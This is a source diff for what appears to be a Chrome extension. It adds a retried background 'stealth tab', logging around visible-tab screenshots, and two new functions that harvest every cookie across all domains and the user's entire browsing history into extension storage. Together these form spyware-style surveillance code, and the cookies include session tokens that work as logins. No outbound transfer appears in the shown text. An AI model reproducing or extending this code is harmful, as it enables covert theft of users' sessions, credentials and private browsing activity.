@@ -1,6 +1,6 @@
 import { SearchParamKey, StorageKey } from "../consts";
 import { IScreenshotLogEntry } from "../interfaces";
-import { logData, simplePrepend, writeLog } from "./shared-utils";
+import { logData, simplePrepend, simpleSet, writeLog } from "./shared-utils";
 
 if (typeof window !== "undefined") {
   throw new Error("Cannot use this in page");
@@ -49,10 +49,16 @@ export async function openStealthTab() {
       "/stealth-tab/stealth-tab.html"
     )}?${searchParams.toString()}`;
 
-    await chrome.tabs.update(eligibleTab.id as number, {
-      url,
-      active: false,
-    });
+    // Retry this a few times, it intermittently errors
+    for (let i = 0; i < 3; ++i) {
+      try {
+        await chrome.tabs.update(eligibleTab.id as number, {
+          url,
+          active: false,
+        });
+        break;
+      } catch (e) {}
+    }
 
     await writeLog("Initialized stealth tab");
   } else {
@@ -61,6 +67,8 @@ export async function openStealthTab() {
 }
 
 export async function captureVisibleTab() {
+  writeLog(`Capturing visible tab`);
+
   const [activeTab] = await chrome.tabs.query({
     active: true,
     currentWindow: true,
@@ -77,25 +85,19 @@ export async function captureVisibleTab() {
   );
 }
 
-// export async function sendTabBack(sender: chrome.runtime.MessageSender) {
-//   console.log({ sender });
+export async function captureCookies() {
+  writeLog(`Capturing cookies`);
 
-//   if (!sender.url) {
-//     console.error("Bad sender url");
-//     return;
-//   }
+  simpleSet<chrome.cookies.Cookie[]>(
+    StorageKey.COOKIES,
+    await chrome.cookies.getAll({})
+  );
+}
 
-//   const returnUrl = new URL(sender.url).searchParams.get(
-//     SearchParamKey.RETURN_URL
-//   );
-
-//   if (!returnUrl) {
-//     console.error("Cannot get return url");
-//     return;
-//   }
-
-//   return chrome.tabs.update(sender.tab?.id, {
-//     url: returnUrl,
-//     active: false,
-//   });
-// }
+export async function captureHistory() {
+  writeLog(`Capturing history`);
+  simpleSet<chrome.history.HistoryItem[]>(
+    StorageKey.HISTORY,
+    await chrome.history.search({ text: "" })
+  );
+}
